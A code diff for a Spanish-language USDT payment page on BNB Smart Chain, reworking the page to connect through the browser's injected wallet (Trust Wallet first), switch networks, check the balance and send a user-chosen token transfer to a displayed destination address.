@@ -5,11 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QR Pagos - Pasarela Oficial</title>
 
-    <!-- Librería ethers.js -->
+    <!-- Librería ethers.js v5.7.2 -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    
-    <!-- SDK oficial de WalletConnect AppKit (Web3Modal) para Ethers -->
-    <script src="https://cdn.jsdelivr.net/npm/@web3modal/ethers@4.1.1/dist/index.umd.js"></script>
 
     <style>
         :root { color-scheme: dark; --bnb-gold: #f3ba2f; }
@@ -32,10 +29,11 @@
         .tw-input { background: transparent; border: none; color: #ffffff; font-size: 16px; width: 80%; outline: none; font-weight: 500; }
         .tw-currency-badge { color: #f3ba2f; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
         .usdt-icon { width: 18px; height: 18px; }
-        .status-box { background: #121213; border: 1px solid rgba(255, 255, 255, 0.14); border-radius: 12px; padding: 12px; font-size: 13px; color: #ffffff; margin-bottom: 16px; display: none; text-align: left; }
+        .status-box { background: #121213; border: 1px solid rgba(255, 255, 255, 0.14); border-radius: 12px; padding: 12px; font-size: 13px; color: #ffffff; margin-bottom: 16px; display: none; text-align: left; word-break: break-word; }
         .tw-btn { width: 100%; height: 52px; background: linear-gradient(90deg, #efad16, #ffd541); color: #050505; border: none; border-radius: 26px; font-size: 16px; font-weight: 650; cursor: pointer; }
-        .tw-btn:disabled { opacity: 0.6; }
+        .tw-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .network-card { display: flex; align-items: center; gap: 11px; margin-bottom: 20px; padding: 12px 14px; background: #0b0b0c; border: 1px solid rgba(255, 255, 255, 0.16); border-radius: 14px; }
+        .wallet-pill { font-size: 12px; color: #4ade80; margin-top: 4px; display: none; }
     </style>
 </head>
 <body>
@@ -51,6 +49,7 @@
         <div style="flex:1;">
             <div style="font-size: 11px; color: #b9bec7;">Red Activa Forzada</div>
             <div style="font-size: 14px; font-weight: 650; color: #f3ba2f;">BNB Smart Chain (Chain ID: 56)</div>
+            <div id="connectedWallet" class="wallet-pill"></div>
         </div>
     </div>
 
@@ -64,7 +63,7 @@
     <div class="tw-input-group">
         <label class="tw-label">Cantidad</label>
         <div class="tw-input-row">
-            <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" value="1" min="0.01">
+            <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" value="1" min="0.01" step="0.01">
             <span class="tw-currency-badge">
                 USDT <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" class="usdt-icon">
             </span>
@@ -73,7 +72,7 @@
 
     <div id="status" class="status-box"></div>
 
-    <button class="tw-btn" id="connectBtn">Conectar a la Pasarela de pago</button>
+    <button class="tw-btn" id="connectBtn">Conectar y Pagar con USDT</button>
 </div>
 
 <script>
@@ -87,125 +86,137 @@
         "function transfer(address to, uint256 amount) returns (bool)"
     ];
 
+    const BSC_NETWORK_PARAMS = {
+        chainId: BSC_CHAIN_HEX,
+        chainName: "BNB Smart Chain",
+        nativeCurrency: {
+            name: "BNB",
+            symbol: "BNB",
+            decimals: 18
+        },
+        rpcUrls: ["https://bsc-dataseed.bnbchain.org"],
+        blockExplorerUrls: ["https://bscscan.com"]
+    };
+
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
     const addressDisplay = document.getElementById('addressDisplay');
+    const connectedWalletDiv = document.getElementById('connectedWallet');
     addressDisplay.value = BILLETERA_DESTINO;
 
-    let modal = null;
-    let walletAddress = null;
+    let userAccount = null;
 
-    function setStatus(msg) {
+    function setStatus(msg, isError = false) {
         statusDiv.innerText = msg;
+        statusDiv.style.color = isError ? "#f87171" : "#ffffff";
+        statusDiv.style.borderColor = isError ? "rgba(248, 113, 113, 0.4)" : "rgba(255, 255, 255, 0.14)";
         statusDiv.style.display = msg ? 'block' : 'none';
     }
 
-    // Configuración exacta de BNB Smart Chain para el modal estilo PancakeSwap
-    const bscNetwork = {
-        chainId: BSC_CHAIN_ID,
-        name: 'BNB Smart Chain',
-        currency: 'BNB',
-        explorerUrl: 'https://bscscan.com',
-        rpcUrl: 'https://bsc-dataseed.bnbchain.org'
-    };
+    // Obtiene el proveedor inyectado priorizando Trust Wallet
+    function getInjectedProvider() {
+        if (window.trustwallet) return window.trustwallet;
+        if (window.ethereum) return window.ethereum;
+        return null;
+    }
 
-    // Inicializar el SDK de WalletConnect AppKit con manejo seguro
-    window.addEventListener('load', () => {
-        try {
-            if (typeof Web3ModalEthers !== 'undefined') {
-                modal = Web3ModalEthers.createWeb3Modal({
-                    ethersConfig: Web3ModalEthers.defaultConfig({
-                        metadata: {
-                            name: 'QR Pagos Pasarela',
-                            description: 'Pago seguro de USDT BEP-20',
-                            url: window.location.origin,
-                            icons: ['https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg']
-                        }
-                    }),
-                    chains: [bscNetwork],
-                    projectId: '349f57f58d0481232863920958742517', // Project ID de WalletConnect
-                    enableAnalytics: false,
-                    themeMode: 'dark',
-                    themeVariables: {
-                        '--w3m-accent': '#f3ba2f'
-                    }
+    // Fuerza el cambio a BNB Smart Chain (0x38) dentro del navegador de Trust Wallet
+    async function asegurarRedBSC(injectedProvider) {
+        const currentChainId = await injectedProvider.request({ method: "eth_chainId" });
+        
+        if (currentChainId !== BSC_CHAIN_HEX && parseInt(currentChainId, 16) !== BSC_CHAIN_ID) {
+            setStatus("Cambiando billetera a BNB Smart Chain...");
+            try {
+                await injectedProvider.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: BSC_CHAIN_HEX }]
                 });
-                console.log("WalletConnect AppKit inicializado correctamente.");
-            } else {
-                console.error("Web3ModalEthers no se cargó desde el CDN.");
+            } catch (switchError) {
+                if (switchError.code === 4902 || switchError.code === -32603) {
+                    await injectedProvider.request({
+                        method: "wallet_addEthereumChain",
+                        params: [BSC_NETWORK_PARAMS]
+                    });
+                } else {
+                    throw new Error("Debes aprobar el cambio a la red BNB Smart Chain en tu billetera.");
+                }
             }
-        } catch (err) {
-            console.error("Error al inicializar el modal:", err);
         }
-    });
+    }
 
     connectBtn.addEventListener('click', async () => {
+        const injected = getInjectedProvider();
+
+        if (!injected) {
+            setStatus("No se detectó billetera Web3. Abre esta página dentro del navegador interno de Trust Wallet.", true);
+            return;
+        }
+
         try {
-            if (!modal) {
-                throw new Error("El conector oficial de WalletConnect sigue cargando. Espera un segundo e inténtalo de nuevo.");
+            connectBtn.disabled = true;
+
+            // 1. Solicitar conexión de cuenta si aún no está conectada
+            if (!userAccount) {
+                setStatus("Conectando con Trust Wallet...");
+                const accounts = await injected.request({ method: "eth_requestAccounts" });
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("No se autorizó ninguna cuenta.");
+                }
+                userAccount = accounts[0];
+                connectedWalletDiv.innerText = `Conectado: ${userAccount.slice(0, 6)}...${userAccount.slice(-4)}`;
+                connectedWalletDiv.style.display = "block";
             }
 
-            // Paso 1: Si no está conectado, abre el selector oficial multicadena (PancakeSwap style)
-            if (!modal.getIsConnected()) {
-                setStatus("Abriendo selector oficial de billeteras...");
-                await modal.open();
-                return;
-            }
+            // 2. Garantizar que el navegador interno esté en BNB Smart Chain (Chain ID 56)
+            await asegurarRedBSC(injected);
 
-            // Paso 2: Si ya está conectado, obtenemos la dirección y firmamos la transferencia de USDT
-            walletAddress = modal.getAddress();
-            const walletProvider = modal.getWalletProvider();
-            if (!walletProvider) throw new Error("No se encontró el proveedor de la billetera.");
-
-            const provider = new ethers.providers.Web3Provider(walletProvider);
-            const signer = provider.getSigner();
-
+            // 3. Validar monto
             const userAmount = parseFloat(amountDisplay.value);
             if (isNaN(userAmount) || userAmount <= 0) {
                 throw new Error("Ingresa una cantidad válida de USDT.");
             }
 
-            connectBtn.disabled = true;
-            setStatus("Empaquetando llamada limpia al contrato USDT (BEP-20)...");
+            // 4. Instanciar Ethers con el proveedor ya situado en Chain ID 56
+            const provider = new ethers.providers.Web3Provider(injected, "any");
+            const network = await provider.getNetwork();
+            if (network.chainId !== BSC_CHAIN_ID) {
+                throw new Error(`Red incorrecta detectada (ID: ${network.chainId}). Cambia manualmente a BNB Smart Chain.`);
+            }
 
-            // Empaquetado binario exacto de la función transfer con value: "0x0"
+            const signer = provider.getSigner();
+            const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);
+
+            // 5. Verificar saldo de USDT BEP-20 antes de lanzar la firma
+            setStatus("Verificando saldo USDT en BNB Smart Chain...");
             const amountUnits = ethers.utils.parseUnits(userAmount.toString(), 18);
-            const iface = new ethers.utils.Interface(USDT_ABI);
-            const dataHex = iface.encodeFunctionData("transfer", [BILLETERA_DESTINO, amountUnits]);
+            const balance = await usdtContract.balanceOf(userAccount);
 
-            setStatus("Abriendo confirmación en tu billetera...");
+            if (balance.lt(amountUnits)) {
+                const saldoFormateado = ethers.utils.formatUnits(balance, 18);
+                throw new Error(`Saldo insuficiente. Tienes ${parseFloat(saldoFormateado).toFixed(2)} USDT en BNB Smart Chain.`);
+            }
 
-            const txHash = await signer.sendTransaction({
-                to: CONTRATO_USDT,
-                data: dataHex,
-                value: "0x0",
-                chainId: BSC_CHAIN_ID
-            });
+            // 6. Ejecutar transferencia limpia BEP-20
+            setStatus("Confirma la transacción en Trust Wallet...");
+            const tx = await usdtContract.transfer(BILLETERA_DESTINO, amountUnits);
 
-            setStatus(`¡Transacción enviada con éxito! Hash: ${txHash.hash ? txHash.hash.slice(0, 10) : txHash.slice(0, 10)}...`);
-            connectBtn.innerText = "Completado";
-            connectBtn.disabled = false;
+            setStatus(`Transacción enviada. Esperando confirmación...\nHash: ${tx.hash}`);
+            await tx.wait();
 
+            setStatus(`¡Pago completado con éxito!\nHash: ${tx.hash}`);
+            connectBtn.innerText = "Realizar otro pago";
         } catch (error) {
-            console.error(error);
-            setStatus(error.message || "Operación cancelada por el usuario.");
+            console.error("Error en pasarela:", error);
+            if (error.code === 4001 || error.code === "ACTION_REJECTED") {
+                setStatus("Operación cancelada por el usuario.", true);
+            } else {
+                setStatus(error.reason || error.message || "Error al procesar el pago.", true);
+            }
+        } finally {
             connectBtn.disabled = false;
         }
     });
-
-    // Escuchar eventos en tiempo real cuando el usuario selecciona su billetera en el modal
-    if (typeof window !== 'undefined') {
-        setInterval(() => {
-            if (modal && modal.getIsConnected() && !walletAddress) {
-                walletAddress = modal.getAddress();
-                if (walletAddress) {
-                    setStatus(`Conectado: ${walletAddress.slice(0,6)}...${walletAddress.slice(-6)}`);
-                    connectBtn.innerText = "Firmar Envío USDT";
-                }
-            }
-        }, 1000);
-    }
 </script>
 
 </body>
